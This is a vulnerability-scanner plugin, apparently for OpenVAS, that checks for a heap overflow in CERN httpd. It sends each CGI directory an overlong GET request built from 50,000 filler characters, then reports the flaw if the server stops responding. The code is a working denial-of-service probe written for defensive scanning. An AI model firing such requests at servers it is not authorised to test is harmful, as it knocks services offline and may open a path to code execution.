if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.17231" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_name( "CERN httpd CGI name heap overflow" );
	script_category( ACT_DESTRUCTIVE_ATTACK );
	script_copyright( "Copyright (C) 2005 Michel Arboi" );
	script_family( "Web Servers" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "solution", value: "Ask your vendor for a patch or move to another server." );
	script_tag( name: "summary", value: "It was possible to kill the remote
  web server by requesting GET /cgi-bin/A.AAAA[...]A HTTP/1.0

  This is known to trigger a heap overflow in some servers like CERN HTTPD." );
	script_tag( name: "impact", value: "A cracker may use this flaw to disrupt your server. It *might*
  also be exploitable to run malicious code on the machine." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("http_func.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
port = http_get_port( default: 80 );
if(http_is_dead( port: port )){
	exit( 0 );
}
for dir in nasl_make_list_unique( "/", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	url = strcat( dir, "/A.", crap( 50000 ) );
	req = http_get( item: url, port: port );
	res = http_send_recv( port: port, data: req );
	if(res == NULL && http_is_dead( port: port )){
		security_message( port: port );
		exit( 0 );
	}
}
exit( 99 );

